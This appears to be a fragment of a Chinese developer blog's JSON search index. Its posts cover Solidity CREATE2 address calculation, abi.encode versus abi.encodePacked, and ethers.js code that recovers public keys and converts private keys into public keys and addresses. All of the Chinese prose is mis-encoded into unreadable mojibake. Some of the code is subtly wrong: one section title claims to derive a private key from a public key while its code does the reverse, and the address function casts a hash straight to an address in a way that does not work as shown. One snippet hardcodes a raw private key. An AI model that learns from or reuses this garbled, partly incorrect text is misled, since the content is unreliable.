å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff address(this), //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ) ) ); &#125; è¿è¡Œç»“æœï¼š å†å°†è·å–çš„åœ°å€é€šè¿‡remixä¸Šçš„At Addressè·å–åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„å‡½æ•°æ£€éªŒç»“æœï¼š At Address: éªŒè¯ç»“æœï¼ˆæ­£ç¡®ï¼‰ï¼š ã€abi.encodePackedã€‘é€šè¿‡ abi.encodePackedå¯¹è¦éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç å’Œä»£ä¼ å‚æ•°ï¼ˆid &#x3D; 1, name &#x3D; â€œbiyouâ€ï¼‰è¿›è¡Œâ€œéç´§â€æ‰“åŒ…ï¼š 12345// ç´§æ‰“åŒ…function encodePackedBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; result = abi.encodePacked(temp, abi.encodePacked(id,name));&#125; è¿è¡Œç»“æœçš„éƒ¨åˆ†æˆªå›¾ï¼š å°†è·å–çš„bytecodeçš„å€¼ï¼Œæ”¾å…¥create2Addresså‡½æ•°ä¸­,ä¼ å…¥ç›saltï¼ˆbiyouï¼‰ï¼Œè®¡ç®— Studentåˆçº¦çš„åœ°å€ create2Addresså‡½æ•°åŒä¸Š è¿è¡Œç»“æœï¼š å†å°†è·å–çš„åœ°å€é€šè¿‡remixä¸Šçš„At Addressè·å–åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„å‡½æ•°æ£€éªŒç»“æœï¼š At Address: è¿è¡Œç»“æœï¼ˆå‡ºé”™ï¼‰ï¼š 2. abi.encodePacked2.1 ç¼–ç æ¼”ç¤º å°†ç»™å®šå‚æ•°æ ¹æ®å…¶æ‰€éœ€æœ€ä½ç©ºé—´ç¼–ç ã€‚ç±»ä¼¼äºabi.encodeï¼Œä½†æ˜¯ä¼šæŠŠå…¶ä¸­å¡«å……çš„å¾ˆå¤š0çœç•¥ã€‚æ¯”å¦‚ï¼Œåªç”¨1å­—èŠ‚æ¥ç¼–ç uintç±»å‹ã€‚å½“ä½ æƒ³çœç©ºé—´ï¼Œå¹¶ä¸”ä¸ä¸åˆçº¦äº¤äº’çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨abi.encodePackedï¼Œä¾‹å¦‚ç®—ä¸€äº›æ•°æ® çš„hashæ—¶ã€‚ æœ€ä½ç©ºé—´ç¼–ç ï¼ˆä¸ªäººç†è§£ï¼‰: å› ä¸ºåœ¨ä»¥å¤ªåŠEVMä¸­çš„ABIï¼Œé»˜è®¤ç»™æ¯ä¸ªå±æ€§ï¼ˆå­—æ®µï¼‰èµ‹äºˆä¸€ä¸ª 32å­—èŠ‚ï¼ˆ32 * 8 &#x3D; 256ä½ï¼‰çš„é•¿åº¦ï¼ˆä¸è¶³éƒ¨åˆ†è¢«0å¡«å……ï¼‰, å®é™…å ç”¨é•¿åº¦å–å†³äºå±æ€§çš„ç±»å‹ã€‚ æ•´å‹ï¼š 1&gt;uint8 num = 1; // è¿™ä¸ªå ç”¨8bitï¼Œå³ä¸€ä¸ªå­—èŠ‚ï¼Œå‰é¢å°†å¡«å……31 * 8 ä¸ªé›¶ï¼Œåˆå› ä¸ºåœ¨ä»¥å¤ªåŠä¸­æ•°æ®ä¸€èˆ¬æ ¼å¼ä¸º16è¿›åˆ¶ï¼Œ16è¿›åˆ¶æ•°çš„ä¸€ä½å å››ä¸ª xxxx(xæ˜¯0æˆ–1) ä¾‹ï¼š 0xff = 11111111 è¿™æ ·å‰é¢æ˜¾ç¤ºçš„0çš„ä¸ªæ•°ä¸º 31 * 8 &#x2F; 4 &#x3D; 62ä¸ªï¼ˆuint8 num &#x3D; 1ï¼Œæœ¬èº«è¡¨ç¤ºä¸ºï¼š0x01ï¼‰ æ‰€ä»¥ä½¿ç”¨abi.encodePackedæ‰“åŒ…ï¼Œå°†ä¼šæ˜¯ä¿ç•™uint8æœ¬èº«çš„é•¿åº¦ï¼ˆ8ä½ï¼‰å³1å­—èŠ‚å³0x01ï¼Œ å¦‚å›¾ï¼š 1&gt;uint256 num2 = 1;//å ç”¨ 256ä½ï¼Œå³ 0x0000000000000000000000000000000000000000000000000000000000000001ï¼Œå› ä¸ºnum2å£°æ˜ä¸ºuint256æ˜ç¡®æŒ‡æ˜äº†å ç”¨256ä½ï¼Œæ‰€ä»¥EVMä¼šç»™num2åˆ†é…çš„æœ€ä½ç©ºé—´ä¸º 256ä½ æ‰€ä»¥ä½¿ç”¨abi.encodePackedæ‰“åŒ…ï¼Œå°†ä¼šæ˜¯ä¿ç•™uint256æœ¬èº«çš„é•¿åº¦ï¼ˆ256ä½ï¼‰å³32å­—èŠ‚ å¦‚å›¾ï¼š bytesnï¼ˆnçš„èŒƒå›´æ˜¯[1,32]ï¼‰ç±»å‹ï¼šå’Œuintç±»å‹ç±»ä¼¼ bytes1 &#x3D;&#x3D;&gt; uint8 å…³äº byteså®¶æ—ç§»æ­¥&#x3D;&#x3D;ã€‹ stringç±»å‹ï¼š å°†å­—ç¬¦ä¸²è½¬ä¸ºbytesç±»å‹ä¹‹åå®é™…æœ‰å¤šé•¿å°±ä¿ç•™å¤šé•¿ å­—ç¬¦ä¸²è½¬bytesä»£ç ï¼š 123function stingConvertBytes(string memory _str) external pure returns(bytes memory result)&#123; result = abi.encodePacked(_str);&#125; addressç±»å‹ï¼š å› ä¸ºaddressæ˜¯160ä½çš„ï¼Œæ‰€ä»¥åªä¿ç•™160ä½å³å¯ å®šä¹‰çš„å˜é‡ï¼š 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; ä»£ç 1ï¼š num1æ˜¯uint8ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ num2æ˜¯uint256ç±»å‹ï¼Œå ç”¨32ä¸ªå­—èŠ‚ _addræ˜¯addressç±»å‹ï¼Œå ç”¨20ä¸ªå­—èŠ‚ nameæ˜¯stringç±»å‹ï¼Œå ç”¨å­—èŠ‚æ•°å–å†³äºå®é™…æƒ…å†µé•¿åº¦ bs1æ˜¯bytes1ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ 123function testABIEncodePacked1() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num1, _addr, name, bs1);&#125; ç»“æœï¼š ä»£ç 2ï¼š &#96;&#96;num1æ˜¯uint8ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚&#96; num2æ˜¯uint256ç±»å‹ï¼Œå ç”¨32ä¸ªå­—èŠ‚ _addræ˜¯addressç±»å‹ï¼Œå ç”¨20ä¸ªå­—èŠ‚ nameæ˜¯stringç±»å‹ï¼Œå ç”¨å­—èŠ‚æ•°å–å†³äºå®é™…æƒ…å†µé•¿åº¦ bs1æ˜¯bytes1ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ 123function testABIEncodePacked2() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num2, _addr, name, bs1);&#125; çœ‹è¿è¡Œç»“æœï¼š 3. æ€»ç»“ä¸éœ€è¦å’Œå…¶ä»–åˆçº¦äº¤äº’çš„æ—¶å€™å¤§å¤šé€‰æ‹© abi.encodePackedçš„æ‰“åŒ…æ–¹å¼ï¼ŒåŒ…æ‹¬ç­¾åæ“ä½œä»€ä¹ˆçš„ éœ€è¦ä¸å…¶ä»–åˆçº¦è¿›è¡Œäº¤äº’çš„åˆ™é€‰æ‹©abi.encodeçš„æ‰“åŒ…æ–¹å¼â€”å…¶ä»–çš„åˆçº¦äº¤äº’æ­£åœ¨å­¦ä¹ ","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"}]},{"title":"Create2","slug":"Solidity/Basic_Knowledge/Create2","date":"2023-05-23T08:10:10.000Z","updated":"2023-05-23T08:10:10.000Z","comments":true,"path":"2023/05/23/Solidity/Basic_Knowledge/Create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/23/Solidity/Basic_Knowledge/Create2/","excerpt":"","text":"Create &amp;&amp; Create 21. create1.1 ç®€ä»‹ æ¦‚å¿µï¼š æ™ºèƒ½åˆçº¦å¯ä»¥ç”±å…¶ä»–åˆçº¦å’Œæ™®é€šè´¦æˆ·åˆ©ç”¨ createæ“ä½œç åˆ›å»ºã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œæ–°åˆçº¦çš„åœ°å€éƒ½ä»¥ç›¸åŒçš„æ–¹å¼è®¡ç®—ï¼šåˆ›å»ºè€…çš„åœ°å€(é€šå¸¸ä¸ºéƒ¨ç½²çš„é’±åŒ…åœ°å€æˆ–è€…åˆçº¦åœ°å€)å’Œnonce(è¯¥åœ°å€å‘é€äº¤æ˜“çš„æ€»æ•°,å¯¹äºåˆçº¦è´¦æˆ·æ˜¯åˆ›å»ºçš„åˆçº¦æ€»æ•°,æ¯åˆ›å»ºä¸€ä¸ªåˆçº¦nonce+1))çš„å“ˆå¸Œã€‚ è®¡ç®—å¼ï¼š æ–°åœ°å€ = hash(åˆ›å»ºè€…åœ°å€, nonce) åˆ›å»ºè€…åœ°å€ä¸ä¼šå˜ï¼Œä½†nonceå¯èƒ½ä¼šéšæ—¶é—´è€Œæ”¹å˜ï¼Œå› æ­¤createåˆ›å»ºçš„åˆçº¦åœ°å€ä¸å¥½é¢„æµ‹ã€‚ 2.create22.1 ç®€ä»‹ create2çš„ç”¨æ³•å’Œcreateæœ‰ç‚¹ç±»å‹ï¼ŒåŒæ ·æ˜¯newä¸€ä¸ªåˆçº¦ï¼Œå¹¶ä¼ å…¥æ–°åˆçº¦æ„é€ å‡½æ•°æ‰€éœ€çš„å‚æ•°ï¼Œä¸åŒç‚¹åœ¨äºè¦å¤šä¼ å…¥ä¸€ä¸ªsaltï¼ˆç›ï¼‰å‚æ•°ï¼š 1Contract X = new Contract&#123;salt: _salt, value: _value&#125;(params); è§£è¯»ï¼šContractæ˜¯è¦åˆ›å»ºçš„åˆçº¦åï¼ŒXæ˜¯åˆçº¦å¯¹è±¡ï¼ˆaddressï¼‰ï¼Œ_saltæ˜¯æŒ‡å®šçš„ç›ï¼›å¦‚æœæ„é€ å‡½æ•°æ˜¯payableï¼Œå¯ä»¥åœ¨åˆ›å»ºæ—¶ä¼ å…¥_valueæ•°é‡çš„ETHï¼Œparamsæ˜¯æ–°åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°ã€‚ 2.2 è®¡ç®—create2åœ°å€æ³¨ï¼šå¦‚æœéœ€è¦è¿›è¡Œåˆçº¦äº¤äº’ï¼Œä¸”å¾…éƒ¨ç½²åˆçº¦çš„æ„é€ å™¨å¸¦å‚ï¼Œåˆ™éœ€è¦å¯¹å¾…ä¼ å‚æ•°è¿›è¡Œabi.encode()æ‰“åŒ…ï¼Œå†ä½¿ç”¨ abi.encodePacked()å¯¹bytecodeå’Œabi.encode()çš„ç»“æœè¿›è¡Œç´§æ‰“åŒ… å¦‚ä»£ç æ‰€ç¤ºï¼š 123456function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode å†™æ­» bytes memory temp = type(Student).creationCode; // è¿™é‡Œçš„å‚æ•°å€¼æˆ‘å†™æ­»äº†ï¼ˆStudent æ„é€ å™¨çš„å‚æ•°ï¼‰ result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; â—â—â—abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)) å¤–å±‚çš„abi.encodePacked()å°†ä¸ä¼šå¯¹abi.encode(1,&quot;biyou&quot;)çš„å€¼è¿›è¡Œç´§æ‰“åŒ…äº†ï¼Œä¸¾ä¾‹å¦‚ä¸‹ï¼š ä»£ç 1ï¼š 1234567// éç´§æ‰“åŒ… -- æ¶‰åŠäº†åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // å°†å­—èŠ‚ç å’Œå‚æ•°è¿›è¡Œç´§æ‰“åŒ… result = abi.encodePacked(temp, abi.encode(id,name));&#125; ç»“æœ1ï¼š ä»£ç 2ï¼š 123456// éç´§æ‰“åŒ… -- æ¶‰åŠäº†åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°function encodeBycode1(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // å°†å­—èŠ‚ç å’Œå‚æ•°è¿›è¡Œéç´§æ‰“åŒ… result = abi.encode(temp, abi.encode(id,name));&#125; ç»“æœ2ï¼š æµ‹è¯•åˆçº¦ï¼› 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// ä¸€ä¸ªç”¨äºæµ‹è¯•çš„åˆçº¦contract Student &#123; uint256 public id ; string public name; constructor(uint256 _id, string memory _name) &#123; id = _id; name = _name; &#125; function getId() external view returns(uint256) &#123; return id; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// create2åˆçº¦contract create2 &#123; // ä½¿ç”¨create2è®¡ç®—åœ°å€,æˆ‘åªéœ€è¦æ”¹å˜salt(stringç±»å‹)çš„å€¼å°±å¯ä»¥å°±ç®—å‡ºä¸ä¸€æ ·çš„åœ°å€ function create2Address(string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff address(this), //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ…åå†è¿›è¡Œhash keccak256(getBycode()) //è·å–è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  å†è¿›è¡Œhash )) ) ) ); &#125; // ä½¿ç”¨create2è®¡ç®—åœ°å€,ä¼ å…¥ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ,æˆ‘åªéœ€è¦æ”¹å˜salt(stringç±»å‹)çš„å€¼å°±å¯ä»¥å°±ç®—å‡ºä¸ä¸€æ ·çš„åœ°å€ function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff address(this), //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ) ) ); &#125; // è·å–éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼ˆå†…éƒ¨åˆçº¦ï¼‰ function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode å†™æ­» bytes memory temp = type(Student).creationCode; // è¿™é‡Œçš„å‚æ•°å€¼æˆ‘å†™æ­»äº†ï¼ˆStudent æ„é€ å™¨çš„å‚æ•°ï¼‰ result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; // é€šè¿‡create2éƒ¨ç½²åˆçº¦ï¼Œnewçš„å½¢å¼ function makeSudentByCreate2(string memory _salt, uint256 id, string memory name) external returns(Student student)&#123; student = new Student&#123;salt: keccak256(abi.encodePacked(_salt))&#125;(id, name); &#125;&#125; ä¸€ä¸ªçµæ´»ä¸€ç‚¹çš„ä»£ç ï¼š 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff addToDeploy, //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ))); &#125;&#125; 2.3 æš´ç ´æ±‚è§£create2åœ°å€â€”â€”â€”â€”è®¡ç®—å‡º å°†æ¥çš„åœ°å€åˆçº¦å«æœ‰æŸä¸ªå­—æ®µæ“ä½œæ–¹æ³• &#x3D;&#x3D;&#x3D;&#x3D;ã€‹è®¡ç®—æŒ‡å®šåˆçº¦åœ°å€ï¼ˆå«æŸä¸ªå­—æ®µï¼‰ ç›¸å…³é“¾æ¥","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"ä»äº¤æ˜“è·å–å…¬é’¥","slug":"Solidity/Basic_Knowledge/ä»äº¤æ˜“è·å–å“ˆå¸Œ","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/ä»äº¤æ˜“è·å–å“ˆå¸Œ/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/%E4%BB%8E%E4%BA%A4%E6%98%93%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C/","excerpt":"","text":"äº¤æ˜“å“ˆå¸Œ &#x3D;ã€‹å…¬é’¥ä»ä¸€ç¬”é“¾ä¸Šçš„äº¤æ˜“å“ˆå¸Œè·å–ç­¾åçš„å…¬é’¥ ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;;const provider = new ethers.providers.JsonRpcProvider(connection);// äº¤æ˜“çš„hashconst txHash = &quot;&quot;;// è·å–äº¤æ˜“ä¿¡æ¯const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //æ‰“å°äº¤æ˜“è¯¦æƒ…// txData å¯¹è±¡å†…çš„å­—æ®µç¼ºä¸€ä¸å¯const txData = &#123; // gasPrice: transaction.gasPrice, // è¿™ä¸ªä¸éœ€è¦ï¼Œå¦åˆ™ä¼šæŠ¥é”™ gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// å¯¹txDataäº¤æ˜“å¯¹è±¡åºåˆ—åŒ–ä¸ºå…¶åŸå§‹äºŒè¿›åˆ¶æ ¼å¼const signingData = ethers.utils.serializeTransaction(txData);// å¯¹åºåˆ—åŒ–åçš„äº¤æ˜“å¯¹è±¡è¿›è¡Œhashconst msgHash = ethers.utils.keccak256(signingData);// è·å–äº¤æ˜“è¯¦æƒ…ä¸­çš„ r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// è·å–åŸç”Ÿæœªå‹ç¼©çš„å…¬é’¥ï¼Œå³ 0x04 å¼€å¤´çš„let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(rawPublicKey);// æŠŠå¼€å¤´çš„ 0x04 å­—æ®µåˆ æ‰ ===ã€‹ å°† `0x04` æ›¿æ¢æˆ `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(rawPublicKey); ç­¾ååŸç†","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"éªŒè¯ç­¾å","slug":"éªŒè¯ç­¾å","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethersjs","slug":"ethersjs","permalink":"https://biyouqiuqiu.com/tags/ethersjs/"}]},{"title":"ä»¥å¤ªåŠ ç§é’¥å…¬é’¥åœ°å€çš„è½¬åŒ–","slug":"Solidity/Basic_Knowledge/ç§é’¥å…¬é’¥åœ°å€çš„è½¬åŒ–","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/ç§é’¥å…¬é’¥åœ°å€çš„è½¬åŒ–/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/%E7%A7%81%E9%92%A5%E5%85%AC%E9%92%A5%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BD%AC%E5%8C%96/","excerpt":"","text":"ä»¥å¤ªåŠ ç§é’¥ &#x3D;ã€‹å…¬é’¥ &amp;&amp; å…¬é’¥ &#x3D;ã€‹åœ°å€ï¼ˆJavaScriptï¼‰1. äº†è§£ ECDSAç®—æ³•ECDSAé“¾æ¥1 ECDSAé“¾æ¥2 2. secp256k1æ›²çº¿æ¯”ç‰¹å¸å’Œä»¥å¤ªåŠä½¿ç”¨secp256k1å®šä¹‰çš„æ¤­åœ†æ›²çº¿ secp256k1æ›²çº¿ 3. å®‰è£…åº“123npm install ethereumjs-wallet --saveæˆ–npm install ethereumjs-util --save è¿™ä¸¤æ¡å‘½ä»¤ä»»æ„æ‰§è¡Œä¸€æ¡å³å¯ 4. ä»å…¬é’¥è·å–ç§é’¥12345678910111213141516// import Wallet from &quot;ethereumjs-wallet&quot;;// import EthUtil from &quot;ethereumjs-util&quot;;// å› ä¸ºå½“å‰çš„æ²¡æŒ‡å®šæ¨¡å—ï¼Œæ‰€ä»¥é»˜è®¤ä½¿ç”¨requireè¯­å¥å¯¼å…¥åŒ…var Wallet = require(&#x27;ethereumjs-wallet&#x27;).default;var EthUtil = require(&#x27;ethereumjs-util&#x27;);// Get a wallet instance from a private key// privatekeyconst privateKey = &#x27;&#x27;;const privateKeyBuffer = EthUtil.toBuffer(privateKey);const wallet = Wallet.fromPrivateKey(privateKeyBuffer);// Get a public keyconst publicKey = wallet.getPublicKeyString(); console.log(`publicKey is =&gt; $&#123;publicKey&#125;`); è¿è¡Œç»“æœï¼š 5. è·å–ä»¥å¤ªåŠçš„é’±åŒ…åœ°å€5.1 æ–¹æ³•ä¸€é’±åŒ…åœ°å€çš„è®¡ç®—å¼ï¼š address = address(keccak256(publicKey)) solidityä»£ç ï¼š 12345678contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(keccak256(_publickey)); return _subPublickey; &#125; &#125; remixä¸Šçš„ç»“æœï¼š genacheä¸ŠæŸ¥çœ‹é’±åŒ…åœ°å€ï¼š 5.3 æ–¹æ³•äºŒä½¿ç”¨çš„æ˜¯ethersjsä¸­çš„ Walleré’±åŒ…çš„publicKeyå±æ€§è·å–é’±åŒ…çš„å…¬é’¥ï¼Œä½†æ˜¯è·å–å…¬é’¥ä¼šåœ¨èµ·å§‹ä½ç½®å¤šå‡º04è¿™ä¸ªæ•°æ®æ®µï¼Œæˆ‘æš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ ä»£ç ï¼š 123456789101112131415161718192021222324import &#123; ethers &#125; from &quot;ethers&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥ç”Ÿæˆ singerå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey,provider);// é€‰æ‹©ä¸€ä¸ªç§é’¥let testPK = privateKey;// è®¡ç®—å…¬é’¥// const publicKey = curve.keyFromPrivate(testPK).publicKey(&quot;hex&quot;);let publicKey = wallet.publicKey;// 0x607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// 0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// let publicKey = &quot;0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f&quot;;let newKey = publicKey.substring(0,2) + publicKey.substring(4);console.log(`newKey = $&#123;newKey&#125;`); è¿è¡Œç»“æœï¼š å‚è€ƒé“¾æ¥1 å‚è€ƒé“¾æ¥2","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"éªŒè¯ç­¾å","slug":"éªŒè¯ç­¾å","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"}]},{"title":"hashç¯‡","slug":"Solidity/Basic_Knowledge/hashç¯‡","date":"2023-05-18T02:47:10.000Z","updated":"2023-05-18T02:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/hashç¯‡/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/hash%E7%AF%87/","excerpt":"","text":"hash ç¯‡ abi.encodePacked å‡½æ•°å°†å…¶å‚æ•°æŒ‰é¡ºåºæ‹¼æ¥èµ·æ¥ï¼Œä¸æ·»åŠ ä»»ä½•ç±»å‹æ ‡è¯†ç¬¦æˆ–åˆ†éš”ç¬¦ï¼Œå¹¶è¿”å›ä¸€ä¸ªç´§å‡‘çš„å­—èŠ‚æ•°ç»„ï¼Œä¸åŒ…å«é•¿åº¦ä¿¡æ¯ã€‚è¿™ç§ç¼–ç æ–¹å¼é€‚ç”¨äºæ„é€ å“ˆå¸Œå€¼å’Œç­¾åçš„æƒ…å†µï¼Œå› ä¸ºå®ƒç”Ÿæˆçš„å­—èŠ‚æ•°ç»„ä¸å—å­—èŠ‚å¯¹é½çš„å½±å“ã€‚ abi.encode å‡½æ•°åˆ™å°†å…¶å‚æ•°ç¼–ç ä¸ºåŒ…å«ç±»å‹æ ‡è¯†ç¬¦å’Œé•¿åº¦ä¿¡æ¯çš„å­—èŠ‚æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŠ¨æ€å­—èŠ‚æ•°ç»„ï¼Œå®ƒåŒ…å«äº†å‚æ•°æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚è¿™ç§ç¼–ç æ–¹å¼é€‚ç”¨äºåœ¨ Solidity æ™ºèƒ½åˆçº¦ä¸­è°ƒç”¨å…¶ä»–åˆçº¦å‡½æ•°çš„æƒ…å†µï¼Œå› ä¸ºå®ƒç”Ÿæˆçš„å­—èŠ‚æ•°ç»„å¯ä»¥è¢«æ­£ç¡®åœ°è§£ç ä¸ºå¯¹åº”çš„å‚æ•°ç±»å‹ã€‚ jsä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\test\\\\day04\\\\getHash.abi&quot;).toString());// é€šè¿‡ABIè·å–æ¥å£ç±»const infe = new ethers.utils.Interface(ABI);// 